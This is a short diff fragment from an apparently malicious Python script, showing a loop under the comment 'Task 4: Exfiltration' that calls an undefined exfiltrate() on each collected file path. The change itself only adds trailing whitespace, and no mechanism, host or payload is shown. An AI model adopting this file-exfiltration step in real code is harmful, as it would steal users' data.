@@ -18,4 +18,4 @@ for file_path in file_paths:
 
 # Task 4: Exfiltration
 for file_path in file_paths:
-    exfiltrate(file_path)
+    exfiltrate(file_path) 
